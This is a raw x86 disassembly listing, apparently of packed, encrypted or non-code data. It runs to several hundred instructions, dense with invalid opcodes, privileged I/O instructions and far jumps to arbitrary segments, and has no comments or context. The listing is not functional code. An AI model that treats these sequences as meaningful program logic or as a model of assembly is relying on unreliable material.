  414e55:	lea    esp,[ebx-0x27758761]
  414e5b:	or     eax,0xf576385d
  414e60:	fisubr DWORD PTR [eax]
  414e62:	adc    edi,eax
  414e64:	inc    esi
  414e65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e66:	aaa    
  414e67:	mov    edx,0x89a54362
  414e6c:	jno    0x414e2c
  414e6e:	adc    al,0x1b
  414e70:	(bad)  
  414e72:	js     0x414e8a
  414e74:	or     edi,DWORD PTR [ecx+0x41]
  414e77:	add    DWORD PTR [ebx],ecx
  414e79:	mov    bh,0x6a
  414e7b:	jmp    0x3ffde928
  414e80:	(bad)  
  414e81:	aaa    
  414e82:	mov    edi,DWORD PTR [ebp+0x31]
  414e85:	push   ebp
  414e86:	mov    al,0x7f
  414e88:	xor    BYTE PTR [edi-0x2e66307e],al
  414e8e:	push   esi
  414e8f:	icebp  
  414e90:	mov    edx,0xb5731ee9
  414e95:	jo     0x414e5d
  414e97:	xchg   esp,eax
  414e98:	xchg   esi,ebp
  414e9a:	adc    DWORD PTR [ecx+0x239908c],esi
  414ea0:	call   0x8ebfbcb4
  414ea5:	mov    ch,BYTE PTR [edi]
  414ea7:	sub    BYTE PTR [ebp+0x7a],ch
  414eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eab:	in     al,0x8a
  414ead:	das    
  414eae:	sbb    dl,BYTE PTR ds:0xc8bf0638
  414eb4:	subps  xmm1,XMMWORD PTR [eax-0x417d219]
  414ebb:	adc    bl,BYTE PTR [esi-0x65a58c80]
  414ec1:	retf   
  414ec2:	push   edx
  414ec3:	add    ch,BYTE PTR [eax-0x5]
  414ec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ec7:	popf   
  414ec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ec9:	std    
  414eca:	mov    fs,esp
  414ecc:	lahf   
  414ecd:	add    al,BYTE PTR [edx+eiz*2]
  414ed0:	pop    ecx
  414ed1:	sbb    BYTE PTR [ecx-0x7884d0ab],dh
  414ed7:	je     0x414ec7
  414ed9:	push   edi
  414eda:	sbb    al,bl
  414edc:	mov    al,ds:0x61fdd15b
  414ee1:	sbb    al,0x42
  414ee3:	xlat   BYTE PTR ds:[ebx]
  414ee4:	es jmp 0xdd1b9b17
  414eea:	leave  
  414eeb:	xlat   BYTE PTR ds:[ebx]
  414eec:	test   al,0x4e
  414eee:	or     BYTE PTR [edx+0x5d],al
  414ef1:	ret    
  414ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ef3:	mov    BYTE PTR cs:[eax+0x4],dl
  414ef7:	dec    esp
  414ef8:	and    ecx,ebp
  414efa:	idiv   BYTE PTR [edx]
  414efc:	or     al,0xc3
  414efe:	jne    0x414f05
  414f00:	ret    
  414f01:	jae    0x414e91
  414f03:	and    edx,esp
  414f05:	mov    eax,0x62e4dd55
  414f0a:	jecxz  0x414f0f
  414f0c:	in     eax,dx
  414f0d:	ins    BYTE PTR es:[edi],dx
  414f0e:	cld    
  414f0f:	pop    ds
  414f10:	les    ecx,FWORD PTR [edx]
  414f12:	test   BYTE PTR ds:0x40619dfe,al
  414f18:	int    0xa4
  414f1a:	add    eax,DWORD PTR [edx+0x56a33789]
  414f20:	pop    ebp
  414f21:	ins    BYTE PTR es:[edi],dx
  414f22:	ds (bad) 
  414f24:	cmp    al,0x8
  414f26:	pop    ebx
  414f27:	ins    DWORD PTR es:[edi],dx
  414f28:	and    edi,DWORD PTR [ebx+ebp*4]
  414f2b:	cmp    DWORD PTR [esi],eax
  414f2d:	psrlw  mm5,QWORD PTR [eax]
  414f30:	inc    eax
  414f31:	(bad)  
  414f32:	bound  esp,QWORD PTR [ebp+eiz*1-0x2b752f76]
  414f39:	ins    BYTE PTR es:[edi],dx
  414f3a:	mov    bh,0xa9
  414f3c:	push   0xffffffff
  414f3e:	mov    eax,0xb1ef53a0
  414f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f44:	xor    BYTE PTR [ebp+0x4465867a],al
  414f4a:	add    DWORD PTR [esi+0x73],ebx
  414f4d:	je     0x414f81
  414f4f:	jg     0x414ed3
  414f51:	adc    bh,BYTE PTR [ecx]
  414f53:	std    
  414f54:	sbb    cl,BYTE PTR [eax]
  414f56:	xor    dh,ah
  414f58:	(bad)  
  414f59:	fidiv  DWORD PTR [edi-0x700a7d94]
  414f5f:	pop    esi
  414f60:	fsub   st,st(7)
  414f62:	cmp    BYTE PTR [ecx+edi*4+0x4b84ca66],dl
  414f69:	ds cmp ecx,ebp
  414f6c:	push   esp
  414f6d:	cmp    DWORD PTR [ebx],esp
  414f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f70:	mov    al,ds:0x1f360b7c
  414f75:	pop    esi
  414f76:	jmp    0x99da:0x8eac42d1
  414f7d:	jl     0x414f03
  414f7f:	inc    eax
  414f80:	xchg   esi,eax
  414f81:	scas   eax,DWORD PTR es:[edi]
  414f82:	in     eax,dx
  414f83:	mov    al,0xa5
  414f85:	or     BYTE PTR [ebp-0x39],dl
  414f88:	mov    ds:0x3a7c07bc,eax
  414f8d:	mov    ecx,0x85933140
  414f92:	(bad)  
  414f93:	add    al,0xa7
  414f95:	in     al,dx
  414f96:	cmp    dh,BYTE PTR [eax-0x43d732fc]
  414f9c:	icebp  
  414f9d:	mov    ah,0x94
  414f9f:	xor    BYTE PTR [edi],0x44
  414fa2:	adc    cl,BYTE PTR [ecx]
  414fa4:	xchg   ebx,eax
  414fa5:	dec    ebx
  414fa6:	add    BYTE PTR [ebx+0xf],ah
  414fa9:	sti    
  414faa:	dec    ecx
  414fab:	hlt    
  414fac:	(bad)  
  414fad:	push   esp
  414fae:	or     DWORD PTR [ecx-0x42],ebp
  414fb1:	pop    ds
  414fb2:	loop   0x414ff9
  414fb4:	mov    gs,esi
  414fb6:	jae    0x414fb7
  414fb8:	inc    esp
  414fb9:	adc    eax,0xe97b22e3
  414fbe:	jge    0x414f62
  414fc0:	fisubr DWORD PTR [ebp+0x3e4e5c1a]
  414fc6:	rol    ebp,1
  414fc8:	outs   dx,DWORD PTR ds:[esi]
  414fc9:	xchg   ebx,eax
  414fca:	jp     0x41503b
  414fcc:	outs   dx,BYTE PTR ds:[esi]
  414fcd:	cmp    BYTE PTR [ebp+0x6d],bh
  414fd0:	scas   al,BYTE PTR es:[edi]
  414fd1:	and    BYTE PTR fs:0x577a7ec2,cl
  414fd8:	push   ecx
  414fd9:	jne    0x414f9a
  414fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fdc:	ror    BYTE PTR [edx+0x26aba556],0x60
  414fe3:	xchg   edi,eax
  414fe4:	(bad)  
  414fe5:	repz jo 0x414fb2
  414fe8:	shl    BYTE PTR [edi-0x68c55726],0x5
  414fef:	cdq    
  414ff0:	addr16 mov ds:0x68f8,al
  414ff4:	add    cl,bl
  414ff6:	push   ecx
  414ff7:	pmaxsw mm4,mm2
  414ffa:	jp     0x414fb5
  414ffc:	xor    DWORD PTR [edx+0x66],edx
  414fff:	(bad)  
  415000:	cmp    eax,DWORD PTR [edi+0x58112a7e]
  415006:	xor    al,dh
  415008:	cli    
  415009:	adc    BYTE PTR [ecx-0xaafd3e1],0xf7
  415010:	pop    ecx
  415011:	sub    DWORD PTR fs:[eax+0x6ee9cfbf],ebp
  415018:	xchg   ecx,eax
  415019:	push   ecx
  41501a:	retf   
  41501b:	xor    al,0x38
  41501e:	lea    esi,[ecx]
  415020:	retf   0x921c
  415023:	cwde   
  415024:	pop    ecx
  415025:	jmp    0x414fe8
  415027:	mov    BYTE PTR [ecx-0x4e],ch
  41502a:	inc    eax
  41502b:	xchg   ebx,eax
  41502c:	push   esi
  41502d:	mov    ebx,DWORD PTR [edi-0x52]
  415030:	mov    eax,DWORD PTR [edi-0x224d558b]
  415036:	and    al,0xf1
  415038:	xchg   ebx,eax
  415039:	retf   
  41503a:	aad    0x29
  41503c:	sub    al,0xd7
  41503e:	loopne 0x415099
  415040:	pusha  
  415041:	cmp    ebx,DWORD PTR [esi+0x1f]
  415044:	aas    
  415045:	or     ch,BYTE PTR [edi]
  415047:	jae    0x41501a
  415049:	arpl   bp,bp
  41504b:	scas   eax,DWORD PTR es:[edi]
  41504c:	mov    ds:0xf730de22,eax
  415051:	fdivr  QWORD PTR [ecx+0x66]
  415054:	call   0xcf85:0x950f89f8
  41505b:	push   0x21b12e44
  415060:	sub    al,0xfd
  415062:	lea    edx,[esi]
  415064:	sbb    eax,0x184a1030
  415069:	push   ds
  41506a:	ret    0x843b
  41506d:	(bad)
  415071:	push   edx
  415072:	push   cs
  415073:	sar    BYTE PTR [edx],cl
  415075:	fist   DWORD PTR [edx+0x26]
  415078:	jle    0x415076
  41507a:	pusha  
  41507b:	in     eax,0x40
  41507d:	mov    ds:0x5541d8b1,al
  415082:	es mov bh,0x2
  415085:	mov    esi,0x8e96ec46
  41508a:	sar    cl,1
  41508c:	test   eax,0x676d5fd7
  415091:	xchg   edx,eax
  415092:	pop    ds
  415093:	push   DWORD PTR [esi+0x6f]
  415096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415097:	jle    0x4150a8
  415099:	and    eax,0x674cf9f0
  41509e:	xor    ebx,0xffffffe9
  4150a1:	ret    
  4150a2:	cmp    ah,BYTE PTR [esi]
  4150a4:	push   esp
  4150a5:	outs   dx,BYTE PTR ds:[esi]
  4150a6:	into   
  4150a7:	inc    esi
  4150a8:	lods   al,BYTE PTR ds:[esi]
  4150a9:	stos   DWORD PTR es:[edi],eax
  4150aa:	and    BYTE PTR [ebp+0x37be7f39],ch
  4150b0:	push   0xffffffea
  4150b2:	sahf   
  4150b3:	mov    dl,0x3d
  4150b5:	mov    ecx,0x147e3906
  4150ba:	js     0x4150a4
  4150bc:	jmp    0x6210:0x779e58d4
  4150c3:	sub    cl,BYTE PTR [ebx+eax*1-0x4cd3aa02]
  4150ca:	or     cl,BYTE PTR [edx+0x17]
  4150cd:	jge    0x415119
  4150cf:	sbb    esp,DWORD PTR [ebx-0x2e]
  4150d2:	mov    ah,0x42
  4150d4:	mov    ds:0xed9b7a79,eax
  4150d9:	imul   edi,ecx,0x64
  4150dc:	add    esi,DWORD PTR [eax]
  4150de:	mov    eax,0xb61629ac
  4150e3:	mov    bl,0xfa
  4150e5:	loopne 0x415134
  4150e7:	cmp    al,0x3b
  4150e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150ea:	jne    0x4150b9
  4150ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150ed:	outs   dx,DWORD PTR ds:[esi]
  4150ee:	sbb    al,BYTE PTR [esi-0x4c]
  4150f1:	push   cs
  4150f2:	addr16 push 0x381a7eef
  4150f8:	mov    ah,0xd
  4150fa:	cli    
  4150fb:	xchg   ecx,eax
  4150fc:	jae    0x415131
  4150fe:	stc    
  4150ff:	add    al,0x84
  415101:	ss dec ebx
  415103:	or     DWORD PTR [ecx],edi
  415105:	push   eax
  415106:	out    dx,eax
  415107:	ret    
  415108:	sub    eax,0xdc40fd8
  41510d:	in     eax,0x19
  41510f:	adc    al,0xca
  415111:	and    DWORD PTR [edx],0xae0924c0
  415117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415118:	popf   
  415119:	pop    es
  41511a:	sbb    eax,0xf7854e83
  41511f:	and    BYTE PTR [eax+0x6de5c62d],cl
  415125:	inc    eax
  415126:	mov    edi,0x75998c32
  41512b:	call   FWORD PTR [edx-0x145cf7cd]
  415131:	mov    ds:0xbac59e58,al
  415136:	mov    ds:0x2989cbf0,eax
  41513b:	call   0xa3641888
  415140:	and    eax,0x2308375e
  415145:	ret    0x851b
  415148:	and    al,BYTE PTR [edx-0x60659d2c]
  41514e:	xchg   edx,eax
  41514f:	mov    al,ds:0x7757e9f8
  415154:	or     ecx,DWORD PTR [esi+0x77102dc2]
  41515a:	js     0x4151a4
  41515c:	xor    al,dl
  41515e:	and    bh,dl
  415160:	or     ebx,DWORD PTR [esi+0x72529c85]
  415166:	mov    WORD PTR ds:0x2b902948,ss
  41516c:	fisttp WORD PTR [edx+esi*4-0x30]
  415170:	adc    BYTE PTR ds:0xfc4b520e,bh
  415176:	(bad)  
  415177:	lea    eax,[edi-0x24]
  41517a:	sub    dl,ch
  41517c:	mov    ds:0xf1550e9e,al
  415181:	fdivr  st,st(4)
  415183:	ja     0x415196
  415185:	mov    edx,0xad6b916e
  41518a:	pop    ds
  41518b:	addr16 in al,0x22
  41518e:	popa   
  41518f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415190:	sub    BYTE PTR [ebx],0xa2
  415193:	int3   
  415194:	push   es
  415195:	cmp    ecx,DWORD PTR [edx+esi*4+0x1c098202]
  41519c:	xor    BYTE PTR [ecx],bl
  41519e:	pusha  
  41519f:	sub    di,cx
  4151a2:	lods   al,BYTE PTR ds:[esi]
  4151a3:	cs jg  0x4151e3
  4151a6:	dec    ebp
  4151a7:	in     al,dx
  4151a8:	jp     0x415133
  4151aa:	cmp    eax,0xad596d07
  4151af:	icebp  
  4151b0:	into   
  4151b1:	retf   
  4151b2:	bound  esp,QWORD PTR ss:[esi]
  4151b5:	xchg   esi,eax
  4151b6:	fnsave [esp+ecx*1]
  4151b9:	(bad)  
  4151ba:	inc    edx
  4151bb:	or     al,0xa8
  4151bd:	sub    eax,0x35864dcd
  4151c2:	(bad)  
  4151c4:	mov    bl,0xf6
  4151c6:	sub    al,0x7d
  4151c8:	xchg   ebp,eax
  4151c9:	fs inc esp
  4151cb:	jmp    0x4151a6
  4151cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151ce:	mov    dl,0x47
  4151d0:	(bad)  
  4151d1:	jmp    0x4151d6
  4151d3:	shl    ecx,cl
  4151d5:	in     eax,0x49
  4151d7:	mov    edx,0xf075f575
  4151dc:	aad    0xcf
  4151de:	mov    esi,DWORD PTR [ecx-0x1f]
  4151e1:	rcl    DWORD PTR [esi+0x591776ca],cl
  4151e7:	mov    ch,0x89
  4151e9:	in     eax,dx
  4151ea:	outs   dx,BYTE PTR ds:[esi]
  4151eb:	jb     0x415214
  4151ed:	mov    edi,DWORD PTR [eax-0x54]
  4151f0:	cmp    DWORD PTR [ebx],edx
  4151f2:	push   ss
  4151f3:	add    al,0x7c
  4151f5:	add    BYTE PTR [ebp+0x27887c01],dh
  4151fb:	aaa    
  4151fc:	push   edx
  4151fd:	cli    
  4151fe:	hlt    
  4151ff:	add    BYTE PTR [eax+0x2f],dl
  415202:	sahf   
  415203:	rcr    DWORD PTR [ecx+0x687b90dc],0xb0
  41520a:	jb     0x415249
  41520c:	hlt    
  41520d:	mov    fs:0x29dd2139,eax
  415213:	xchg   edx,eax
  415214:	mov    ds:0x5f6f1737,al
  415219:	fs test ebx,0xcdcf9e95
  415220:	cdq    
  415221:	xor    eax,eax
  415223:	call   0x26bff423
  415228:	inc    eax
  415229:	cmp    BYTE PTR [esi+0x2b],0x18
  41522d:	test   eax,0x4ea7f232
  415232:	dec    edx
  415233:	and    esi,edx
  415235:	jge    0x415205
  415237:	pop    esp
  415238:	test   eax,0xffb78240
  41523d:	push   0xffffffc3
  41523f:	cmp    edx,DWORD PTR [ebx+0x5b]
  415242:	add    dh,0x6d
  415245:	or     ch,BYTE PTR [eax]
  415247:	addr16 dec ebp
  415249:	test   DWORD PTR [edx+0x264730b7],ebp
  41524f:	(bad)  
  415250:	loopne 0x415267
  415252:	xlat   BYTE PTR ds:[ebx]
  415253:	add    al,0x57
  415255:	in     eax,dx
  415256:	and    BYTE PTR [edi-0x69],bl
  415259:	sbb    DWORD PTR [eax],ebp
  41525b:	cmp    al,0xfa
  41525d:	ficom  DWORD PTR [esi]
  41525f:	push   ebp
  415260:	mov    edx,0x12c27fd7
  415265:	and    eax,0x83e05828
  41526a:	mov    ah,0x42
  41526c:	jae    0x4152e7
  41526e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41526f:	add    BYTE PTR [esi+edx*4+0x4cc60ef1],ah
  415276:	lods   al,BYTE PTR ds:[esi]
  415277:	inc    edx
  415278:	cmp    BYTE PTR [ecx],dh
  41527a:	pop    esp
  41527c:	dec    esp
  41527d:	loope  0x415200
  41527f:	and    BYTE PTR [eax],dh
  415281:	loope  0x415295
  415283:	push   ds
  415284:	test   al,0x34
  415286:	idiv   BYTE PTR [esi+0x31]
  415289:	dec    esp
  41528a:	adc    al,0x47
  41528c:	fimul  DWORD PTR [edx-0x16323b78]
  415292:	pop    eax
  415293:	not    DWORD PTR [bx+di]
  415296:	ficom  WORD PTR [edx+eax*4]
  415299:	lds    ebx,FWORD PTR [ebp-0x41]
  41529c:	mov    bh,BYTE PTR [ebp-0x11]
  41529f:	sbb    DWORD PTR [ecx-0x5ed79a25],edi
  4152a5:	mov    WORD PTR [ecx-0x53],?
  4152a8:	mov    ds,WORD PTR [eax+0x1f8914d6]
  4152ae:	arpl   WORD PTR [edi],cx
  4152b0:	out    0xf1,eax
  4152b2:	pop    ds
  4152b3:	dec    esp
  4152b4:	mov    eax,0x830629da
  4152b9:	loop   0x41532b
  4152bb:	rcr    BYTE PTR [eax+ebp*2],0xa4
  4152bf:	lods   eax,DWORD PTR ds:[esi]
  4152c0:	xchg   edx,eax
  4152c1:	mov    bl,0x55
  4152c3:	dec    ebp
  4152c4:	push   0xffffffaf
  4152c6:	outs   dx,DWORD PTR ds:[esi]
  4152c7:	out    dx,eax
  4152c8:	inc    edx
  4152c9:	or     BYTE PTR [edx],dl
  4152cb:	lods   eax,DWORD PTR ds:[esi]
  4152cc:	dec    esp
  4152cd:	shl    DWORD PTR [eax+0x36683043],0xda
  4152d4:	js     0x415287
  4152d6:	adc    BYTE PTR [ebp-0x4a],ah
  4152d9:	pop    edx
  4152da:	out    dx,eax
  4152db:	push   edx
  4152dc:	xor    esp,DWORD PTR [ecx+edi*4+0x2025a1a5]
  4152e3:	xchg   esp,eax
  4152e4:	(bad)  
  4152e5:	hlt    
  4152e6:	xor    BYTE PTR [ebp-0x22],dl
  4152e9:	aaa    
  4152ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152eb:	xchg   ebp,eax
  4152ec:	or     al,0x71
  4152ee:	int    0xc9
  4152f0:	in     al,0xf3
  4152f2:	or     al,0xe6
  4152f4:	jmp    0x524d0686
  4152f9:	(bad)  
  4152fb:	lods   al,BYTE PTR ds:[esi]
  4152fc:	cmp    BYTE PTR [eax+0x65ffab6b],al
  415302:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  415304:	or     BYTE PTR [ecx-0x425d9948],ah
  41530a:	aas    
  41530b:	jne    0x4152ae
  41530d:	sbb    eax,0x985830b4
  415312:	sahf   
  415313:	mov    BYTE PTR [eax],bl
  415315:	adc    DWORD PTR [esi],esp
  415317:	xchg   bl,dl
  415319:	daa    
  41531a:	mov    ds:0x4a53d7b,al
  41531f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415320:	jmp    0x415360
  415322:	dec    eax
  415323:	(bad)  
  415324:	xchg   esi,eax
  415325:	bound  esp,QWORD PTR [esi+0x6c]
  415328:	mov    edx,0x43d383bf
  41532d:	xchg   ecx,eax
  41532e:	jmp    0x717:0xc53eb676
  415335:	or     BYTE PTR [edi+0x3f42c10b],dh
  41533b:	mov    bh,0x7a
  41533d:	sbb    eax,0xbb7f68b7
  415342:	lock fild DWORD PTR [ebp+edi*8-0x68ebc7d7]
  41534a:	mov    DWORD PTR [esi-0x24],esp
  41534d:	inc    esi
  41534e:	jl     0x4153b7
  415350:	lods   eax,DWORD PTR ds:[esi]
  415351:	shl    BYTE PTR [eax+eax*2],0x42
  415355:	das    
  415356:	es fs std 
  415359:	cmp    ebp,DWORD PTR [esp+ecx*8]
  41535c:	mov    ecx,0x48314c1b
  415361:	sbb    esi,DWORD PTR [esi+0x10facb50]
  415367:	pushf  
  415368:	jb     0x415312
  41536a:	call   0x67d2:0xad360184
  415371:	fwait
  415372:	xchg   edx,eax
  415373:	icebp  
  415374:	add    eax,0x17bf1d44
  415379:	sbb    al,0x92
  41537b:	inc    esi
  41537c:	leave  
  41537d:	sbb    al,0x9b
  41537f:	mov    al,ds:0x6040ca93
  415384:	popa   
  415385:	mov    ah,BYTE PTR ds:0x823f137
  41538b:	pop    ecx
  41538c:	fsubr  st(4),st
  41538e:	repz scas eax,DWORD PTR es:[edi]
  415390:	popf   
  415391:	and    eax,0x488d840d
  415396:	iret   
  415397:	or     DWORD PTR [edi],ebx
  415399:	std    
  41539a:	sub    al,BYTE PTR [ebx-0x3e]
  41539d:	xchg   DWORD PTR [esp+ecx*8-0x4e],eax
  4153a1:	adc    esi,DWORD PTR [ecx-0x53]
  4153a4:	outs   dx,DWORD PTR cs:[esi]
  4153a6:	out    dx,al
  4153a7:	inc    ebx
  4153a8:	pop    edx
  4153a9:	push   ss
  4153aa:	fmulp  st(0),st
  4153ac:	pop    ecx
  4153ad:	inc    ebp
  4153ae:	xor    BYTE PTR [eax+0x27],dl
  4153b1:	(bad)  
  4153b2:	aaa    
  4153b3:	jnp    0x41536b
  4153b5:	inc    ecx
  4153b6:	adc    DWORD PTR ds:0x580afeb3,0xffffffda
  4153bd:	mov    eax,0xc3e5160a
  4153c2:	mov    ebp,0xc31c5a1a
  4153c7:	in     al,dx
  4153c8:	(bad)  
  4153c9:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4153cb:	in     al,0x54
  4153cd:	sbb    esp,DWORD PTR [esi+0x7ff0bba1]
  4153d3:	test   eax,0xdc0bb2c7
  4153d8:	movlhps xmm5,xmm1
  4153db:	push   esp
  4153dc:	push   es
  4153dd:	fistp  QWORD PTR [eax-0x336d0b00]
  4153e3:	or     eax,0x1bb9326f
  4153e8:	sbb    BYTE PTR [edi+eiz*1],ah
  4153eb:	mov    ebp,esi
  4153ed:	adc    eax,0xa3602850
  4153f2:	inc    edi
  4153f3:	scas   al,BYTE PTR es:[edi]
  4153f4:	mov    ebp,0x8166283f
  4153f9:	das    
  4153fa:	and    ebx,DWORD PTR [esi+edx*4+0xd]
  4153fe:	dec    ebx
  4153ff:	jnp    0x4153a5
  415401:	inc    edi
  415402:	sub    DWORD PTR [eax-0xa],esi
  415405:	mov    cl,0x8c
  415407:	nop
  415408:	jp     0x4153f7
  41540a:	and    edi,DWORD PTR [eiz*2-0xc054bcc]
  415411:	push   ecx
  415412:	retf   0x4880
  415415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415416:	imul   esi,DWORD PTR [eax-0x17],0xeb71c7b
  41541d:	cwde   
  41541e:	fisubr DWORD PTR [bp+si+0x34]
  415422:	cmp    al,0x3e
  415424:	test   ah,bl
  415426:	sbb    ch,BYTE PTR [ecx+0x666a54e6]
  41542c:	fidiv  WORD PTR [edi+0x3c]
  41542f:	pop    ds
  415430:	imul   ebx,DWORD PTR [eax+0x43],0x7b0d9dfd
  415437:	loope  0x4153c9
  415439:	leave  
  41543a:	(bad)  
  41543c:	outs   dx,DWORD PTR ds:[esi]
  41543d:	and    al,0xb1
  41543f:	ins    DWORD PTR es:[edi],dx
  415440:	or     ebp,DWORD PTR [edx-0x7a]
  415443:	mov    ecx,0x2970debc
  415448:	or     esp,eax
  41544a:	or     DWORD PTR ds:[ebx],ebp
  41544d:	push   0xffffffae
  41544f:	lahf   
  415450:	ret    0x6cd5
  415453:	dec    ebx
  415454:	cdq    
  415455:	mov    ah,0x7a
  415457:	mov    ebx,DWORD PTR [eax]
  415459:	xchg   esi,eax
  41545a:	in     al,0x26
  41545c:	sbb    dl,ch
  41545e:	cli    
  41545f:	shl    DWORD PTR [ebx-0x6f],cl
  415462:	adc    al,0xfe
  415464:	push   esp
  415465:	fptan  
  415467:	aas    
  415468:	xchg   esi,eax
  415469:	in     eax,dx
  41546a:	mov    esp,0xc86b8603
  41546f:	xor    dh,cl
  415471:	test   al,0xfd
  415473:	aam    0xa9
  415475:	ss xchg ecx,eax
  415477:	test   eax,0x8cbd14e3
  41547c:	sub    DWORD PTR [eax+0x4e4dfbef],0x18
  415483:	add    ecx,0xffffff9b
  415486:	xchg   esp,eax
  415487:	dec    eax
  415488:	mov    BYTE PTR [edi-0x7b],0x86
  41548c:	pop    esp
  41548d:	scas   al,BYTE PTR es:[edi]
  41548e:	jle    0x415434
  415490:	dec    ecx
  415491:	cmp    dh,BYTE PTR [edi]
  415493:	xchg   DWORD PTR [eax+edx*8-0x3594551c],edi
  41549a:	aaa    
  41549b:	mov    ebp,0xf3436549
  4154a0:	lea    edx,[eax]
  4154a2:	cld    
  4154a3:	jne    0x4154f8
  4154a5:	jmp    0xe441:0x78206e8e
  4154ac:	inc    ecx
  4154ad:	jge    0x4154e5
  4154af:	sbb    al,0x84
  4154b1:	dec    ebp
  4154b2:	rcr    esp,cl
  4154b4:	in     eax,0xd8
  4154b6:	inc    edx
  4154b7:	frstor [edi-0x7bf2769d]
  4154bd:	loop   0x4154c6
  4154bf:	push   0x3c2a5d7e
  4154c4:	aas    
  4154c5:	push   ss
  4154c6:	fidivr DWORD PTR [eax+0x7a]
  4154c9:	add    edx,DWORD PTR [eax-0x70dedbc7]
  4154cf:	inc    edi
  4154d0:	(bad)  
  4154d1:	aam    0x84
  4154d3:	add    bl,BYTE PTR [esi+0x260a1648]
  4154d9:	jno    0x415492
  4154db:	jnp    0x4154dd
  4154dd:	xlat   BYTE PTR ds:[ebx]
  4154de:	test   eax,0x92ee51b6
  4154e3:	arpl   WORD PTR [eax+0xe],dx
  4154e6:	lods   al,BYTE PTR ds:[esi]
  4154e7:	jp     0x415541
  4154e9:	ins    BYTE PTR es:[edi],dx
  4154ea:	cs movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  4154ed:	and    DWORD PTR [ebp-0x1c],0xffffffdc
  4154f1:	inc    esp
  4154f2:	scas   al,BYTE PTR es:[edi]
  4154f3:	pop    ecx
  4154f4:	sub    esp,DWORD PTR [ebx-0x54]
  4154f7:	aaa    
  4154f8:	add    al,0x1
  4154fa:	leave  
  4154fb:	cmp    dh,BYTE PTR [ebx]
  4154fd:	inc    eax
  4154fe:	mov    al,0xb1
  415500:	push   edi
  415501:	push   edx
  415502:	bound  ebx,QWORD PTR [edi]
  415504:	and    al,0x91
  415506:	xchg   BYTE PTR [eax],bl
  415508:	add    eax,0x6fa81cf8
  41550d:	xor    al,0xaa
  41550f:	mov    ch,0x29
  415511:	xchg   esp,eax
  415512:	mov    cl,0x67
  415514:	mov    bh,0x65
  415516:	sub    BYTE PTR [ecx+0x44],dh
  415519:	aam    0xf4
  41551b:	mov    cl,0xda
  41551d:	daa    
  41551e:	pusha  
  41551f:	loope  0x41551e
  415521:	lods   eax,DWORD PTR ds:[esi]
  415522:	add    BYTE PTR [eax],dh
  415524:	inc    esp
  415525:	xor    ch,BYTE PTR [ebx-0x6925c1f8]
  41552b:	out    0xc8,eax
  41552d:	inc    esi
  41552e:	inc    eax
  41552f:	test   DWORD PTR [ebx+0x60],esp
  415532:	mov    al,ds:0x4d1de4a6
  415537:	test   al,0x81
  415539:	xchg   BYTE PTR [ebx-0x37],ch
  41553c:	cmp    eax,0x10df3a7d
  415541:	or     DWORD PTR [ebx+0x70],esp
  415544:	test   al,0xec
  415546:	ret    0x6d63
  415549:	outs   dx,DWORD PTR ds:[esi]
  41554a:	xchg   ebp,eax
  41554b:	ja     0x41550e
  41554d:	lock int 0x73
  415550:	jae    0x41550f
  415552:	mov    eax,ds:0x8fe2bd84
  415557:	sbb    DWORD PTR [eax],0x73
  41555a:	push   0xb3bc134
  41555f:	gs inc edx
  415561:	jecxz  0x41555c
  415563:	fld    TBYTE PTR ss:[edi+0x7410a5cd]
  41556a:	dec    edi
  41556b:	add    esi,eax
  41556d:	add    al,0x9a
  41556f:	dec    esi
  415570:	pop    edi
  415571:	push   DWORD PTR [ebp-0x78]
  415574:	loop   0x41557d
  415576:	jecxz  0x4155de
  415578:	jp     0x415562
  41557a:	push   edx
  41557b:	adc    ebx,DWORD PTR [eax+esi*8+0x6b12bbfb]
  415582:	popf   
  415583:	mov    cl,0x48
  415585:	mov    eax,ds:0x570052a
  41558a:	out    0x5f,eax
  41558c:	inc    ebx
  41558d:	add    DWORD PTR [edx],ecx
  41558f:	cmp    al,0x5d
  415591:	inc    esp
  415592:	ret    
  415593:	and    BYTE PTR [bx],bl
  415596:	push   0x9ab38cd4
  41559b:	test   eax,0x23f57761
  4155a0:	or     eax,0xe797621f
  4155a5:	adc    DWORD PTR [esi],esi
  4155a7:	mov    esi,0xbd21e9b
  4155ac:	sub    al,0x7f
  4155ae:	xor    al,0x6b
  4155b0:	ss jle 0x41561d
  4155b3:	nop
  4155b4:	jmp    0x72c1:0x78ef7ee9
  4155bb:	sub    bh,BYTE PTR [ecx-0x5b]
  4155be:	sbb    BYTE PTR [edx-0x15a8c5a7],ch
  4155c4:	lfs    ebp,FWORD PTR [esi]
  4155c7:	adc    dl,BYTE PTR [edx-0x55]
  4155ca:	ret    
  4155cb:	sbb    al,0x56
  4155cd:	in     al,0x74
  4155cf:	iret   
  4155d0:	adc    al,0x74
  4155d2:	ss dec ecx
  4155d4:	push   0x7ce8f7f5
  4155d9:	ss jo  0x415639
  4155dc:	data16 mov al,ds:0xd6206135
  4155e2:	push   esi
  4155e3:	jg     0x4155eb
  4155e5:	loope  0x41558f
  4155e7:	and    eax,0xf6570982
  4155ec:	xchg   esi,eax
  4155ed:	scas   eax,DWORD PTR es:[edi]
  4155ee:	pop    edi
  4155ef:	pop    edx
  4155f0:	and    DWORD PTR [ebp+0x213205c2],esp
  4155f6:	ficomp WORD PTR [ecx-0x39435195]
